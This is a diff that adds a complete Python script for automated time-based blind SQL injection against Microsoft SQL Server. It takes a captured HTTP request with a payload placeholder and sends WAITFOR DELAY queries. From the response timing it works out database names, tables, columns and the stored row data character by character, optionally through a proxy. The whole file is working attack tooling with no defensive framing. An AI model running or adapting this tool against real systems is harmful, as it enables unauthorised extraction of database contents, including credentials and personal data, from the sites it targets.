@@ -1,0 +1,442 @@
+#!/usr/bin/env python3
+
+from urllib.parse import unquote_plus as urldec
+from urllib.parse import quote_plus as urlenc
+from bs4 import BeautifulSoup as bs
+from time import sleep
+import argparse
+import string
+import sys
+import re
+
+verbose = False
+wait = 2
+wait_sec = 0.0
+
+
+class RequestSender:
+    import requests
+    s = requests.Session()
+    timeout = 12.0
+    retry = 3
+    err_wait = 1
+    url = ''
+    method = ''
+    header = ''
+    init_payload = ''
+
+    @staticmethod
+    def gen_header(source):
+        lines = source.split('\n')
+
+        method, path, _ = lines[0].split(' ')
+        host, *port = lines[1].split(' ', 1)[1].split(':')
+        port = port or [80]
+        url = f"http://{host}:{port[0]}{path}"
+
+        header = {}
+        for line in lines[2:]:
+            splitted = line.split(':', 1)
+            splitted[1] = splitted[1].split(' ', 1)[1]
+            if splitted[0] != 'Connection':
+                header[splitted[0]] = splitted[1]
+
+        return url, method, header
+
+    @staticmethod
+    def gen_payload(source):
+        result = source.split(r'%5EPAYLOAD%5E')
+        result[0] += left
+        result[1] = right + result[1]
+
+        return result
+
+    def send_request(self, payload):
+        from requests import Request
+        req = Request()
+        if self.method == 'POST':
+            pl = self.init_payload[0] + payload + self.init_payload[1]
+            req = Request(self.method, self.url, headers=self.header, data=pl)
+        # if self.method == 'GET':
+        #     req = Request(self.method, self.url, timeout=self.timeout,
+        #                   headers=self.header, params=payload)
+        else:
+            print("error: now only support POST", file=sys.stderr)
+            exit(1)
+
+        prep = self.s.prepare_request(req)
+
+        for _ in range(self.retry):
+            try:
+                return self.s.send(prep, timeout=self.timeout)
+            except KeyboardInterrupt:
+                exit(1)
+            except:
+                sleep(self.err_wait)
+        else:
+            raise Exception
+
+    def __init__(self, args):
+        input = open(args.request, mode='r').read().strip()
+        raw_header, raw_payload = input.split('\n\n', 1)
+
+        self.url, self.method, self.header = self.gen_header(raw_header)
+        self.init_payload = self.gen_payload(raw_payload)
+
+        if args.proxy:
+            proxy = retr_proxy(args.proxy)
+            self.s.proxies.update(proxy)
+            if verbose:
+                print(f"debug: proxy set: {args.proxy}", file=sys.stderr)
+
+    def __del__(self):
+        self.s.close()
+
+
+def print_verbose(payload):
+    print(f"debug: {urldec(left + payload + right)}", file=sys.stderr)
+
+
+def is_contain(sender, payload, data):
+    if verbose:
+        print_verbose(payload)
+    else:
+        print(f"\r{' ' * (len(data) + 1)}", end='')
+        print(f"\r{data}", end='')
+
+    r = sender.send_request(payload)
+    if r.elapsed.total_seconds() > wait:
+        return True
+    else:
+        return False
+
+
+def retr_loop2(sender, payload1, payload2):
+    prev = ''
+    result = ''
+    while True:
+        # temporary
+        for c in string.ascii_lowercase + string.digits + '-_':
+            payload = payload1 + urlenc(result + c + '%') + payload2
+            if is_contain(sender, payload, result + c + '%'):
+                result += c
+                break
+
+            sleep(wait_sec)
+
+        if result == '':
+            print("\r   ", end='')
+            return ''
+        elif prev == result:
+            print(f"\r{' ' * (len(result) + 1)}\r", end='')
+            result = result[:-1]
+            continue
+
+        payload = payload1 + urlenc(result) + payload2
+        if is_contain(sender, payload, result):
+            return result
+        else:
+            prev = result
+
+
+def retr_loop(sender, payload1, payload2, payload3):
+    result = []
+    i = 0
+    while True:
+        not_in = ','.join([f"'{elem}'" for elem in result]) or "''"
+        payload = payload1 + urlenc(not_in) + payload2
+
+        if verbose:
+            print_verbose(payload + payload3)
+
+        for _ in range(sender.retry):
+            try:
+                content = retr_loop2(sender, payload, payload3)
+                if content == '':
+                    return result
+
+                result.append(content)
+                print(f"\r{i}: {content}")
+                sleep(wait_sec)
+                i += 1
+                break
+            except KeyboardInterrupt:
+                exit(1)
+            except:
+                sleep(sender.err_wait)
+        else:
+            raise Exception
+
+
+def retr_database(sender):
+    base = [
+        "IF (EXISTS(SELECT TOP 1 name FROM master..sysdatabases WHERE name not in (",
+        ") and name like '", "')) WAITFOR DELAY '0:0:" + str(wait) + "'"
+    ]
+    print('databases:')
+    payload3 = urlenc("IF (EXISTS(SELECT DB_NAME() WHERE DB_NAME() like '")
+    payload4 = urlenc("')) WAITFOR DELAY '0:0:" + str(wait) + "'")
+    if verbose:
+        print_verbose(payload3 + payload4)
+    content = retr_loop2(sender, payload3, payload4)
+    print(f"\rcurrent: {content}")
+
+    payload1 = urlenc(base[0])
+    payload2 = urlenc(base[1])
+    payload3 = urlenc(base[2])
+    databases = retr_loop(sender, payload1, payload2, payload3)
+
+    print()
+    print(','.join(databases))
+
+
+def retr_tables(sender, databases):
+    print('tables:')
+
+    base = ["IF (EXISTS(SELECT TOP 1 name FROM ",
+            "..sysobjects WHERE xtype = 'U' AND name not in (",
+            ") and name like '", "')) WAITFOR DELAY '0:0:" + str(wait) + "'"]
+
+    tables = {}
+    for db in databases:
+        print(f"{db}:")
+        payload1 = urlenc(base[0] + db + base[1])
+        payload2 = urlenc(base[2])
+        payload3 = urlenc(base[3])
+        tables[db] = retr_loop(sender, payload1, payload2, payload3)
+
+        print()
+        print(','.join(tables[db]))
+        print()
+
+
+def retr_columns(sender, databases, tables):
+    print('columns:')
+
+    base = ["IF (EXISTS(SELECT TOP 1 ", "..syscolumns.name FROM ",
+            "..syscolumns, ", "..sysobjects WHERE ",
+            "..syscolumns.id=", "..sysobjects.id AND ",
+            "..sysobjects.name='", "' AND ",
+            "..syscolumns.name not in (", ") AND ",
+            "..syscolumns.name like '",
+            "')) WAITFOR DELAY '0:0:" + str(wait) + "'"]
+
+    columns = {}
+    for db in databases:
+        print(f"{db}:")
+        columns[db] = {}
+        for tb in tables[db]:
+            print(f"*{tb}:")
+            payload1 = urlenc(base[0] + db + base[1] + db + base[2] + db +
+                              base[3] + db + base[4] + db + base[5] + db +
+                              base[6] + tb + base[7] + db + base[8])
+            payload2 = urlenc(base[9] + db + base[10])
+            payload3 = urlenc(base[11])
+
+            columns[db][tb] = retr_loop(sender, payload1, payload2, payload3)
+
+            print()
+            print(','.join(columns[db][tb]))
+            print()
+
+
+def retr_data(sender, databases, tables, columns):
+    print('data:')
+
+    base = ["IF (EXISTS(SELECT TOP 1 ", " FROM ",
+            "..", " WHERE ", " not in (", ") and ", " like '",
+            "')) WAITFOR DELAY '0:0:" + str(wait) + "'"]
+    data = {}
+    for db in databases:
+        print(f"{db}:")
+        data[db] = {}
+        for tb in tables[db]:
+            print(f"*{tb}:")
+            data[db][tb] = {}
+            for cl in columns[db][tb]:
+                print()
+                print(f"**{cl}:")
+                payload1 = urlenc(base[0] + cl + base[1] +
+                                  db + base[2] + tb + base[3] + cl + base[4])
+                payload2 = urlenc(base[5] + cl + base[6])
+                payload3 = urlenc(base[7])
+
+                data[db][tb][cl] = retr_loop(
+                    sender, payload1, payload2, payload3)
+
+    for db in databases:
+        for tb in tables[db]:
+            print()
+            print(f"SELECT * FROM {db}..{tb};")
+            print('\t'.join(columns[db][tb]))
+            leng = max([len(data[db][tb][cl]) for cl in columns[db][tb]])
+
+            for i in range(leng):
+                result = []
+                for cl in columns[db][tb]:
+                    try:
+                        result.append(data[db][tb][cl][i])
+                    except KeyboardInterrupt:
+                        exit(1)
+                    except:
+                        result.append('')
+
+                print('\t'.join(result))
+
+    print()
+
+
+def retr_args(raw_args):
+    result = []
+    for arg in raw_args.split(','):
+        elem, *num = arg.split('/')
+        num = num or [1]
+        result += [elem] * int(num[0])
+
+    return result
+
+
+def retr_database_list(raw_databases):
+    result = []
+    for db in raw_databases:
+        if db not in result:
+            result.append(db)
+
+    return result
+
+
+def retr_table_dic(raw_databases, raw_tables):
+    result = {}
+    for db, tb in zip(raw_databases, raw_tables):
+        if db not in result:
+            result[db] = []
+        if tb not in result[db]:
+            result[db].append(tb)
+
+    return result
+
+
+def retr_column_dic(raw_databases, raw_tables, raw_columns):
+    result = {}
+    for db, tb, cl in zip(raw_databases, raw_tables, raw_columns):
+        if db not in result:
+            result[db] = {}
+        if tb not in result[db]:
+            result[db][tb] = []
+        if cl not in result[db][tb]:
+            result[db][tb].append(cl)
+
+    return result
+
+
+def retr_proxy(raw_proxy):
+    proto = args.proxy.split(':')[0]
+    if not re.match(r'^socks5h?$|^https?$', proto):
+        print(f"error: invalid proxy: {args.proxy}", file=sys.stderr)
+        exit(1)
+    return {'http': args.proxy, 'https': args.proxy}
+
+
+def main():
+    sender = RequestSender(args)
+
+    global verbose
+    verbose = args.verbose
+
+    if args.wait:
+        try:
+            global wait_sec
+            wait_sec = float(args.wait)
+            if verbose:
+                print(
+                    f"debug: wait sec set: {wait_sec}", file=sys.stderr)
+        except KeyboardInterrupt:
+            exit(1)
+        except:
+            print(
+                f"error: cannot convert wait to float: -w {args.wait}", file=sys.stderr)
+            exit(1)
+
+    if args.database is None and args.table is None and args.column is None:
+        retr_database(sender)
+
+    elif args.database and args.table is None and args.column is None:
+        raw_databases = retr_args(args.database)
+        databases = retr_database_list(raw_databases)
+        retr_tables(sender, databases)
+
+    elif args.database and args.table and args.column is None:
+        raw_databases = retr_args(args.database)
+        raw_tables = retr_args(args.table)
+        if len(raw_databases) != len(raw_tables):
+            if len(raw_databases) == 1:
+                raw_databases = [raw_databases[0]] * len(raw_tables)
+
+            elif len(raw_tables) == 1:
+                raw_tables = [raw_tables[0]] * len(raw_databases)
+
+            else:
+                print('error: argument length is different', file=sys.stderr)
+                exit(1)
+
+        tables = retr_table_dic(raw_databases, raw_tables)
+        databases = retr_database_list(raw_databases)
+        retr_columns(sender, databases, tables)
+
+    elif args.database and args.table and args.column:
+        raw_databases = retr_args(args.database)
+        raw_tables = retr_args(args.table)
+        raw_columns = retr_args(args.column)
+        if len(raw_databases) != len(raw_tables) or len(raw_databases) != len(raw_columns):
+            if len(raw_databases) == 1:
+                raw_databases = [raw_databases[0]] * \
+                    max(len(raw_tables), len(raw_columns))
+
+            if len(raw_tables) == 1:
+                raw_tables = [raw_tables[0]] * \
+                    max(len(raw_databases), len(raw_columns))
+
+            if len(raw_columns) == 1:
+                raw_columns = [raw_columns[0]] * \
+                    max(len(raw_databases), len(raw_tables))
+
+            if len(raw_databases) != len(raw_tables) or len(raw_databases) != len(raw_columns):
+                print('error: argument length is different', file=sys.stderr)
+                exit(1)
+
+        columns = retr_column_dic(
+            raw_databases, raw_tables, raw_columns)
+        tables = retr_table_dic(raw_databases, raw_tables)
+        databases = retr_database_list(raw_databases)
+        retr_data(sender, databases, tables, columns)
+    else:
+        print('error: invalid arguments', file=sys.stderr)
+        exit(1)
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument(
+        'request', help='http request file (e.g. intersepted request by burp) payload place should be holded by %%5EPAYLOAD%%5E (html encoded ^PAYLOAD^)')
+    parser.add_argument(
+        '-p', '--proxy', help='http or socks5 proxy')
+    parser.add_argument(
+        '-w', '--wait', help='interval between request (default: 0)')
+    parser.add_argument(
+        '-d', '--database', help='database from which you want to dump tables (comma separate (arg[/num][,arg[/num][, ...]]))')
+    parser.add_argument(
+        '-t', '--table', help='table from which you want to dump columns (comma separate (arg[/num][,arg[/num][, ...]]))')
+    parser.add_argument(
+        '-c', '--column', help='column from which you want to dump data (comma separate (arg[/num][,arg[/num][, ...]]))')
+    parser.add_argument(
+        '-v', '--verbose', help='verbose mode', action='store_true')
+    parser.add_argument(
+        '-l', '--left', help='padding string for left', required=True)
+    parser.add_argument(
+        '-r', '--right', help='padding string for right', required=True)
+
+    args = parser.parse_args()
+    left = urlenc(args.left)
+    right = urlenc(args.right)
+    main()
